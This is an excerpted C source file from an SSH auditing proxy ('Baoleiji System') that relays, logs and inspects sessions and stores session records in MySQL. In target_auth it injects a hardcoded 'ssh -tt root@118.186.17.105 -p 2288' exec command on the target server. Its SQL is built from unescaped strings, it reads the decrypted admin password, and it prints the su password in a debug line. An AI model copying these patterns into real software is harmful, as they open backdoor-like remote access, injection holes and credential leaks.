...
extern volatile int block_command_flag;
extern volatile int block_session_id;
extern volatile int fd_flag;
extern volatile int by_operate_thread_running;
...
static int store_client_buf( u_int sid, u_int id, u_char type, Buffer * buf )
{
	int i;
...
static int store_scpair_buf( u_int sid, u_int id, u_char type, Buffer * buf )
{
	int i;
	...
	for( i = 0; i < MAXARRAYSIZE; i++ )
	{
		...
		if( client_buffer_array[i].used && client_buffer_array[i].id == id )
		{
			if( queue_push( client_buffer_array[i].sid, id, client_buffer_array[i].type, type, client_buffer_array[i].buf, buf ) )
			{
...
sighandler( int signo )
{
	...
	if( signo == SIGCHLD )
	{
		...
		printf("Child terminated connection\n");
		//while ((pid = wait( NULL )) > 0) {
		pid = wait( NULL );
		{
			fprintf(stderr, "[%s] pid = %d, child_pid = %d\n", __func__, pid, child_pid);
			if (pid == child_pid || child_pid == 0) {
				query2authd_type4(conn2server_username, conn2server_saddress, sourceip, radius__username, login_method, 0, 1);
				exit( EXIT_SUCCESS );
			}
		}
	}
	...
	else if( signo == SIGUSR1 )
	{
		...
		target_connected = 1;
		query2authd_type4(conn2server_username, conn2server_saddress, sourceip, radius__username, login_method, 1, 0);
...
int fetch_x11_flag(MYSQL *sql_conn, int devices_id)
{
	MYSQL_RES *query_result;
	MYSQL_ROW row;
	int query, ret;
	...
	snprintf (buf, sizeof( buf ), "SELECT x11 FROM devices WHERE id=%d", devices_id);
	query = mysql_query(sql_conn, buf);
	query_result = mysql_store_result(sql_conn);
	row = mysql_fetch_row( query_result );
...
int insert_x11_record(MYSQL *sql_conn, const char *cstr, const char *sstr, const char *audit_addr, const char *radius_username, const char *server_username, int subsid)
{
	MYSQL_RES *query_result;
	MYSQL_ROW row;
	int query, sid = -1i, xid;
	char buf[2560];

	char caddr[64], saddr[64], *ptr;
	int cport, sport;
	...
	*ptr = 0;
	...
	snprintf (buf, sizeof( buf ), "SELECT sid from sessions WHERE cli_addr='%s' AND sport=%d AND addr='%s' AND dport=%d order by sid DESC limit 1",
	...
	snprintf (buf, sizeof(buf), "INSERT INTO x11sessions (sid,cliaddr,svraddr,auditaddr,radius_user,server_user,start,keyboardfile,SMAC,DMAC,subsessionid) "\
			"values(%d,'%s','%s','%s','%s','%s',now(),NULL,%d,%d,%d)",
			sid, caddr, saddr, audit_addr, radius_username, server_username, 
			cport, sport, subsid);
	query = mysql_query(sql_conn, buf);
	query = mysql_query(sql_conn, "SELECT LAST_INSERT_ID()");
	query_result = mysql_store_result(sql_conn);
	row = mysql_fetch_row( query_result );
	xid = atoi(row[0]);
...
void send_message_2_server(int sp[], int block_session_id, const char *message)
{
	struct simple_packet spkt;
	spkt.type = SSH2_MSG_CHANNEL_DATA;
	put_u32(&spkt.data[0], block_session_id);
	put_u32(&spkt.data[4], strlen(message));
	strcpy(&spkt.data[8], message);
	spkt.len = strlen(message) + 8;
	if( writen( sp[0], &spkt, spkt.len + 8 ) != spkt.len + 8 )
		return;
}

int send_su_2_server(int sp[], int block_session_id, const char *su_command, const char *su_password, const char *prompt)
{
	struct simple_packet stmp, spkt;
	...
	put_u32(&stmp.data[0], session_id);
...
void
print_welcome_message(MYSQL *sql_conn, const char *radius_username, int cfd, int remote_id, int compat20, int select)
{
    char buf[2048];
    MYSQL_RES *res;
    MYSQL_ROW row;
    ...
    snprintf(buf, sizeof(buf), "select CEILING((select substring(svalue,locate"\
             "('\"',svalue,locate('\"', svalue,locate('pwdexpired', svalue)+length('pwdexpired'))+1)+1, "\
             "locate('\"',svalue,locate('\"',svalue,locate('\"', svalue,locate('pwdexpired', svalue)+length('pwdexpired'))+1)+1)-"\
             "locate('\"',svalue,locate('\"', svalue,locate('pwdexpired', svalue)+length('pwdexpired'))+1)-1) from setting "\
             "where sname='password_policy')-(unix_timestamp()-lastdateChpwd)/(24*3600)) AS days,username from member "\
             "where username='%s'", radius_username);

    mysql_query(sql_conn, buf);
    res = mysql_store_result(sql_conn);
    row = mysql_fetch_row(res);
    if (row != NULL && row[0] != NULL)
        expire_days = atoi(row[0]);
    ...
    packet_put_int(remote_id);
    if (select)
    snprintf(buf, sizeof(buf), "\033[2J\033[0;0HYour password will be expired in %d days.\x0d\x0a"\
             "Welcome to Baoleiji System.\x0d\x0a"\
             "Please select an IP Address:\x0d\x0a", expire_days);
    else
	    snprintf(buf, sizeof(buf), "\033[2J\033[0;0HYour password will be expired in %d days.\x0d\x0a"\
			    "Welcome to Baoleiji System.\x0d\x0a", expire_days);
...
char * radius_Authenticate( int cfd, u_int server_ip )
{
			...
			while(( spkt.type = packet_read_next( cfd ) ) != SSH_MSG_NONE )
			{
				...
				if( compat20 )
				{
					...
					else if( spkt.type == SSH2_MSG_USERAUTH_REQUEST )
					{
						...
						else if( strcmp( client_autype, "publickey" ) == 0 )
						{
							...
							radius_ret = query2authserver( 1, client_userid, NULL, serverip, sourceip, login_method, use_vpn, 1,
									...
									&auto_su, &su_command, &su_password, &forbidden, -1, NULL, NULL, NULL, &did, &login_commit, &ipv6, &timeout, &report);
							if ( radius_ret == 0 )
							{
						...
						else if( strcmp( client_autype, "password" ) == 0 )
						{
							...
							radius_ret = query2authserver( 1, client_userid, radius_password, serverip, sourceip, login_method, use_vpn, 1,
									NULL, NULL, &conn_mode, &radius_username, &snum, &sinfo, &dest_ip, &dest_port, &dest_username, &dest_password,
									&auto_su, &su_command, &su_password, &forbidden, -1, NULL, &publickey_auth, privatekey_path, &did, &login_commit, &ipv6, &timeout, &report);
					...
					else if( spkt.type == SSH2_MSG_CHANNEL_REQUEST )
					{
						...
						{
							if (fetch_x11_flag(sql_conn, did) == 0)
							{
								printf("Forbidden X11 forwarding in devices.\n");
								cleanup_exit(255);
							}
							else
								x11_flag = 1;
	...
	if( compat20 )
	{
		...
		int choose, page, line, odd, baseline = 4, rows = 18;
		char (*menu)[64];
		char sel[1024];
		int menu_rows, *devicesid, *lmethod;

		/* Print select interface */
		if (conn_mode == CONN_AUDIT_UNIQUE && no_shell == 0)
		{
			print_welcome_message(sql_conn, radius_username, cfd, remote_id, compat20, 0);
		}
		...
		else if( conn_mode == CONN_AUDIT_SELECT )
		{
			...
			while( ret )
			{
				...
				while (1)
				{
					...
					packet_send();
					packet_write_wait();*/
					print_welcome_message(sql_conn, radius_username, cfd, remote_id, compat20, 1);

					for(line = baseline, i = 0, odd = 0; (line < (baseline + rows)) && page * rows * 2 + i < menu_rows; line++, i += 2, odd++)
					{
						packet_start( SSH2_MSG_CHANNEL_DATA );
						packet_put_int( remote_id );
						if (page * rows * 2 + i == menu_rows - 1)
							snprintf(sel, sizeof(sel), "\033[%d;0H[%d]%s\x0d\x0a", line, i + 1, menu[page * rows * 2 + i]);
						else
							snprintf(sel, sizeof(sel), "\033[%d;0H[%d]%s\033[%d;40H[%d]%s\x0d\x0a",
								line, i + 1, menu[page * rows * 2 + i], line, i + 2, menu[page * rows * 2 + i + 1]);
						packet_put_string( sel, strlen( sel ) );
						packet_send();
						packet_write_wait();
					}
					packet_start( SSH2_MSG_CHANNEL_DATA );
					packet_put_int( remote_id );
					snprintf( sel, sizeof( sel ), "[P]Previous page.\033[%d;40H[N]Next page.\x0d\x0a"\
						"[I]Input IP Address.\033[%d;40H[Q]Quit ssh-audit system.\x0d\x0aInput: ", line, line + 1, menu_rows + 1 );
					packet_put_string( sel, strlen( sel ) );
					packet_send();
					packet_write_wait();
					...
					{
						page += 1;
						page = (page > (menu_rows - 1) / (rows * 2)) ? (menu_rows - 1) / (rows * 2) : page;
					}
					else
						break;
				}
				...
				else if( choose > 0 && choose <= rows * 2 && (page * rows * 2 + choose) <= menu_rows )
				{
					printf("choose=%d\n", choose);
					choose = page * rows * 2 + choose;
				}
				else if(choose == -1)
				{
					packet_start( SSH2_MSG_CHANNEL_DATA );
				...
				packet_start( SSH2_MSG_CHANNEL_DATA );
				packet_put_int( remote_id );
				snprintf( sel, sizeof( sel ), "[Q]Quit ssh-audit system!\x0d\x0aInput: ");
				packet_put_string( sel, strlen( sel ) );
				packet_send();
				packet_write_wait();
				choose = process_select_username_input( cfd, remote_id );
				...
				else if( choose > 0 && choose <= menu_rows )
				{
					...
					radius_ret = sshselect2authserver( radius_username, devicesid[choose-1], sourceip, 3, &conn_mode,
							&dest_ip, &dest_port, &dest_username, &dest_password, &auto_su, &su_command, &su_password, &forbidden, &publickey_auth, privatekey_path, &did, NULL );
                    /*radius_ret = query2authserver( 1, client_userid, NULL, serverip, sourceip, login_method, use_vpn, 1,
                        NULL, NULL, &conn_mode, &radius_username, &snum, &sinfo, &dest_ip, &dest_port, &dest_username, &dest_password,
                        &auto_su, &su_command, &su_password, &forbidden, -1, NULL, NULL, NULL, &did, &login_commit, &ipv6, &timeout, &report);
					*/
	...
	while( ret )
	{
		...
		if( FD_ISSET( sp, &readset ) )
		{
			...
			else if (status == 0x03)
			{
				...
				packet_start( SSH2_MSG_CHANNEL_DATA );
				packet_put_int( REMOTEID( 0 ) );
				snprintf(buf, sizeof(buf), "ssh: connect to host %s port %d: Timeout.\x0d\x0aSSH connection to real target failed\x0d\x0a", 
						conn2server_saddress, conn2server_port);
				packet_put_cstring(buf);
				packet_send();
				packet_write_wait();
			}
			else if (status == 0x04) // get child process id
			{
				readn(sp, &child_pid, 4);
				child_pid = ntohl(child_pid);
...
*/
    ...
    signal( 36, sighandler );
    signal( 37, sighandler );
	int fd1[128], fd2[128], waitforline[128],black_or_white[128],sid[128],g_bytes[128],invim[128],insz[128],justoutvim[128],encode[128],get_first_prompt[128];
	...
	* linebuffer[128],
	* sql_query[128],
	* monitor_shell_pipe_name_tm[128],
    * monitor_shell_pipe_name_fm[128],
	* cmd[128],
			...
			if( compat20 )
			{
				...
				if( mitm_channel_request[index].type == SSH2_MSG_CHANNEL_REQUEST )
				{
					...
					if( strcmp( channel_req_str, "shell" ) == 0 )
					{
						...
						logit( "\n%s", buf );
						/* FORKCI */
						g_ci[session_id] = initialize_ci_at_first(session_id, did, radius_username, conn2server_saddress, conn2server_port, conn2server_username, get_remote_ipaddr(), htons(get_remote_port()), sql_conn, forbidden, login_commit);
						command_inspection_fork(g_ci[session_id]);
#if 0 
						...
						monitor_shell_pipe_name_tm[session_id] = ( char * )malloc( 1024 );
                        monitor_shell_pipe_name_fm[session_id] = ( char * )malloc( 1024 );

                        bzero(monitor_shell_pipe_name_tm[session_id],1024);
                        bzero(monitor_shell_pipe_name_fm[session_id],1024);

						sprintf( monitor_shell_pipe_name_tm[session_id], "%s/monitor_shell=%d.0_tm", BINPATH, getpid());
                        sprintf( monitor_shell_pipe_name_fm[session_id], "%s/monitor_shell=%d.0_fm", BINPATH, getpid());
						...
						bzero(sql_query[session_id],string_length);
						sprintf(sql_query[session_id],"insert into sessions  (sid,cli_addr,addr,type,user,start,end,luser,logfile,replayfile,s_bytes,server_addr,dangerous,jump_total,total_cmd,pid,sport,dport,logincommit)  values (NULL,'%s','%s','ssh','%s',now(),now(),'%s','%s','%s',0,'%s',0,0,0,%d,'%s','%s','%d')",sip,dip,user,radius_username,logfilename,replayfilename,audit_address,getpid(),sport,dport,login_commit);
						...
						bzero(sql_query[session_id],string_length);
						sprintf(sql_query[session_id],"select udf_decrypt(password) from member where username='admin'");
						...
						if(my_res_ptr[session_id])
						{
							while(my_sqlrow[session_id] = mysql_fetch_row(my_res_ptr[session_id]))
							{
								...
								strcpy(admin_password,my_sqlrow[session_id][0]);
							}
						}
					...
					else if( strcmp( channel_req_str, "subsystem" ) == 0 ) //( spkt.data[spkt.len-1] == 'p' )
					{
						...
						if( strcmp( subsystem_name, "sftp" ) == 0 )
						{
							...
							if (fetch_sftp_flag(sql_conn, did) == 0) fatal("sftp flag is 0, sessionid = %d, devices id is %d\n", session_id, did);

							if( sql_conn )
							{
								/*snprintf( buf, sizeof( buf ),
										"INSERT INTO sftpsessions(cliaddr,svraddr,audit_addr,radius_user,sftp_user,start,logincommit) \
										VALUES('%s','%s','%s','%s','%s',now(), %d)",
										cstr, sstr, audit_address, radius_username, user, login_commit );
								*/
								char caddr[64], saddr[64], *ptr;
								int cport, sport;
								strcpy(caddr, cstr);
								...
								*ptr = 0;
								snprintf( buf, sizeof( buf ),
										"INSERT INTO sftpsessions(cliaddr,svraddr,audit_addr,radius_user,sftp_user,start,logincommit,sport,dport) \
										VALUES('%s','%s','%s','%s','%s',now(), %d, %d, %d)",
										caddr, saddr, audit_address, radius_username, user, login_commit, cport, sport);
					...
					if( strcmp( &mitm_channel_request[index].data[4], "/usr/local/libexec/sftp-server" ) == 0 )
					{
						...
						if( sql_conn )
						{
							/*snprintf( buf, sizeof( buf ),
									"INSERT INTO sftpsessions(cliaddr,svraddr,audit_addr,radius_user,sftp_user,start,logincommit) \
									VALUES('%s','%s','%s','%s','%s',now(), %d)",
									cstr, sstr, audit_address, radius_username, ssh1_user, login_commit );
							*/
								char caddr[64], saddr[64], *ptr;
								int cport, sport;
								strcpy(caddr, cstr);
...
loop:
		...
		while( 1 )
		{
			...
			if( FD_ISSET( sp[0], &readtmp ) )
			{
				...
				else if (strstr(echo, command_buf) != NULL)
				{
					already_su = 1;
				}
				memset( &spkt, 0x00, spkt.len + 8 );
		...
		{
		stmp.type = 94;
		snprintf( command_buf, sizeof( command_buf ), "%s\x0d\x0a", su_password );
		printf("debug:len=%d, sup=%s\n",strlen(command_buf),su_password);
		stmp.len = strlen(command_buf) + 8;
		put_u32(&stmp.data[0], 0);
		put_u32(&stmp.data[4], strlen(command_buf));
		strcpy(&stmp.data[8], command_buf);
...
/* Do the FREESVR-SSH-PROXY thing */
	...
	for( ;; )
	{
		/*if (ttt == 1)
		{
			send_su_2_server(sp, session_id, "su", "OMaudit", NULL);
			send_message_2_server(sp, session_id, "exit\n");
			ttt = 0;
		}*/
		char *pt;
		...
		/* Read from client and write to socketpair */
		/* Log the stream of client */
		if(fd_flag && FD_ISSET( cfd, &readtmp ) )
		{
			...
			while(( spkt.type = packet_read_next( cfd ) ) != SSH_MSG_NONE )
			{
				...
				if( compat20 )
				{
					...
					else if( spkt.type == SSH2_MSG_CHANNEL_CLOSE )
					{
						...
						printf ("%d %d\n", session_id, session_channel_mode[session_id]);
						if (session_channel_mode[session_id] == X11_MODE)
						{
							session_channel_mode[session_id] = 0;
							if( sql_conn )
							{
								snprintf( buf, sizeof( buf ),
										"UPDATE x11sessions SET end=now() WHERE xid=%d",
										last_insert_id[session_id] );

								printf("%s\n", buf);
								if( !mysql_query( sql_conn, buf ) )
								{
									printf( "Mysql insert \"update\" command X11 log success!\n" );
									last_insert_id[session_id] = 0;
									sftp_cmd_cnt[session_id] = 0;
								}
								else
					...
					else if( spkt.type == SSH2_MSG_CHANNEL_DATA )
					{
						...
						if( session_channel_mode[session_id] == SSH_MODE )
						{
							...
							{
#if 0
					telnet_writelogfile2( &forward2server_packet.data[8], forward2server_packet.len - 8, monitor_shell_pipe_name_fm[session_id], monitor_shell_pipe_name_tm[session_id],
						...
						&waitforline[session_id] , &g_bytes[session_id] , &invim[session_id], &insz[session_id], session_id, black_or_white[session_id], &my_connection[session_id],syslogserver,syslogfacility,mailserver,mailaccount,mailpassword,adminmailaccount,alarm_content,syslogalarm,mailalarm,adminmailaccount_num,radius_username,sstr,user,encode[session_id],&get_first_prompt[session_id],cfd,sp);
								//gettimeofday(&ts2, NULL);
#endif
								block_command_flag = command_inspection_parent_wait_ci_c2s(g_ci[session_id], &forward2server_packet);
							}
						}
				...
				else
				{
							...
							( spkt.type == SSH_SMSG_STDERR_DATA ) )
					{
						...
						if( session_channel_mode[0] == SSH_MODE )
						{
							...
							{
#if 0
                    telnet_writelogfile2( &spkt.data[4], spkt.len - 4, monitor_shell_pipe_name_fm[session_id],
                            monitor_shell_pipe_name_tm[session_id],
                        fd1[session_id], fd2[session_id],inputcommandline[session_id], commandline[session_id],
						cache1[session_id], cache2[session_id], linebuffer[session_id], cmd[session_id], sql_query[session_id], myprompt,
                        black_cmd_list, black_cmd_num, sid[session_id],
                        &waitforline[session_id] , &g_bytes[session_id] , &invim[session_id], &insz[session_id], session_id, black_or_white[session_id], &my_connection[session_id],syslogserver,syslogfacility,mailserver,mailaccount,mailpassword,adminmailaccount,alarm_content,syslogalarm,mailalarm,adminmailaccount_num,radius_username,sstr,user,encode[session_id],&get_first_prompt[session_id],cfd, sp);
...
#endif
								block_command_flag = command_inspection_parent_wait_ci_c2s(g_ci[session_id], &spkt);
							}
						}
		...
		if( FD_ISSET( sp[0], &readtmp ) )
		{
			...
			if( compat20 )
			{
				...
				if(spkt.type == SSH2_MSG_CHANNEL_OPEN)
				{
					...
					if (strncmp(&spkt.data[4], "x11", 3) == 0)
					{
						int x11sid = get_u32(&spkt.data[7]);
						int xid = insert_x11_record(sql_conn, cstr, sstr, audit_address, radius_username, conn2server_username, x11sid);
						session_channel_mode[x11sid] = X11_MODE;
						last_insert_id[x11sid] = xid;
						printf("***********************************x11 server sid = %d, last_insert_id = %d, %d\n", x11sid, xid, session_channel_mode[x11sid]);
					}
				}
				...
				else if( spkt.type == SSH2_MSG_CHANNEL_DATA )
				{
					...
					//                        writen(dst_data, &spkt.data[8], spkt.len-8);
						...
						//printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@hello  %d %d\n", session_channel_mode[0], session_id);
					if (session_channel_mode[session_id] == 0)
						session_channel_mode[session_id] = session_channel_mode[session_map[session_id]];
					if( session_channel_mode[session_id] == SSH_MODE )
					{
						...
						{
#if 0
					telnet_writelogfile( &spkt.data[8], spkt.len - 8, monitor_shell_pipe_name_fm[session_id],
                            monitor_shell_pipe_name_tm[session_id],
                        fd1[session_id], fd2[session_id], inputcommandline[session_id], commandline[session_id],
                        cache1[session_id], cache2[session_id], linebuffer[session_id], cmd[session_id], sql_query[session_id], myprompt,
                        black_cmd_list, black_cmd_num, sid[session_id],
                        &waitforline[session_id] , &g_bytes[session_id] , &invim[session_id], &insz[session_id], &justoutvim[session_id], session_id, black_or_white[session_id], &my_connection[session_id],syslogserver,syslogfacility,mailserver,mailaccount,mailpassword,adminmailaccount,alarm_content,syslogalarm,mailalarm,adminmailaccount_num,radius_username,sstr,user,encode[session_id],&get_first_prompt[session_id],cfd, sp);
/*							telnet_writelogfile( &spkt.data[8], spkt.len - 8, monitor_shell_pipe_name[session_id],
		...
		#endif
							command_inspection_parent_wait_ci_s2c(g_ci[session_id], &spkt);
						}
			...
			else
			{
						...
						( spkt.type == SSH_SMSG_STDERR_DATA ) )
				{
					...
					if( session_channel_mode[0] == SSH_MODE )
					{
						...
						{
#if 0
					telnet_writelogfile( &spkt.data[4], spkt.len - 4,  monitor_shell_pipe_name_fm[session_id],
                            monitor_shell_pipe_name_tm[session_id],
                        fd1[session_id], fd2[session_id], inputcommandline[session_id], commandline[session_id],
                        cache1[session_id], cache2[session_id], linebuffer[session_id], cmd[session_id], sql_query[session_id], myprompt,
                        black_cmd_list, black_cmd_num, sid[session_id],
...
int target_auth( int sock, int sp, int * client_session_id_arg )
{
			...
			while(( spkt.type = packet_read_next( sock ) ) != SSH_MSG_NONE )
			{
				...
				if( compat20 )
				{
					...
					else if( spkt.type == SSH2_MSG_USERAUTH_FAILURE )
					{
						...
						printf("userauth_failure_cnt = %d\n", userauth_failure_cnt);
						if( userauth_failure_cnt == 1 )
						{
							char *method = packet_get_string(NULL);
							printf("%s\n", method);
							if( strcmp( method,"password") == 0 )
							//if( strcmp( method,"publickey,password,keyboard-interactive") == 0 )
							{
								is_challenge = 0;
								packet_start( SSH2_MSG_USERAUTH_REQUEST );
								packet_put_cstring( conn2server_username );
						...
						else
						{
							...
							printf("is_challenge: %d, userauth_failure_cnt=%d\n", is_challenge,userauth_failure_cnt );
							status = 0x02;
							writen( sp, &status, 1 );
	...
	if( compat20 )
	{
		for( index = 0; index < mitm_channel_cnt; index++ )
		{
            ...
            if (mitm_channel_request[index].type == 98 && mitm_channel_request[index].len == 14) {
                packet_start( mitm_channel_request[index].type );
                packet_put_int(0);
                packet_put_cstring("exec");
                packet_put_char(1);
                packet_put_cstring("ssh -tt root@118.186.17.105 -p 2288");
                packet_send();
                packet_write_wait();
                //no_shell = 1;
            }
				...
				if( FD_ISSET( sock, &readset ) )
				{
					while(( spkt.type = packet_read_next( sock ) ) != SSH_MSG_NONE )
					{
						...
						else if( spkt.type == 91 )
						{
							...
							//session_channel_mode[client_session_id] = session_channel_mode[server_session_id];
							//printf("%d\n", session_channel_mode[client_session_id]);
						...
						// modify for X11
						else if (spkt.type == 100) {
								ret = 1;
						}
						else
						{
							//modify for putty connect to ssh6.9
							//ret = 0;
						}
...
target_connect( u_int ip, u_short port, int sp, u_int ssh_proto )
{
	...
	printf("ipv6=%d, dest_ip=%s\n", ipv6, conn2server_saddress);
	...
	client_options.address_family = (ipv6 == 1 ? AF_INET6 : AF_INET);
	client_options.cipher = -1;

	/* Fill configuration defaults. */
	fill_default_options( &client_options );
    //client_options.server_alive_count_max = 5;
	...
	if( ssh_connect( (ipv6 == 1 ? conn2server_saddress : target_host), &hostaddr, htons( port ),
	...
	for( ;; )
	{
        ...
        alive_timeout.tv_sec = 6;
		if( (ret = select( nfd, &readtmp, NULL, NULL, &alive_timeout )) < 0 )
		{
			if( errno == EINTR )
				continue;
        ...
        if (ret == 0) {
                if( compat20 )
                {
                    ...
                    printf( "Send check alive message to server. @ %s\n", str_time( time( NULL ), NULL ) );
                }
